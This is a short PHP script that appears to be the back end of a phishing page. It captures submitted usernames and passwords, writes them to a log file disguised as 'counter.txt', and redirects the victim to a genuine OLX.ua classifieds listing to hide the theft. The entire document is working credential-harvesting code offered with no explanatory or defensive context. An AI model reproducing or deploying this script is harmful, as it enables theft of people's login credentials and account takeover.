<?php
  $username = htmlentities($_POST['username']);
    $password = htmlentities($_POST['password']);
   $output ="
  username: $username
  password: $password
     ";
   echo $output;
   $fp = fopen('counter.txt', 'a');
fwrite($fp, $output . PHP_EOL);
fclose($fp);
 header( "Location: https://www.olx.ua/obyavlenie/zadnyaya-stenka-radiopriemnik-zvezda-54-s-zamkami-IDDgGKS.html?sd=1#120316456e/" );
 
?>
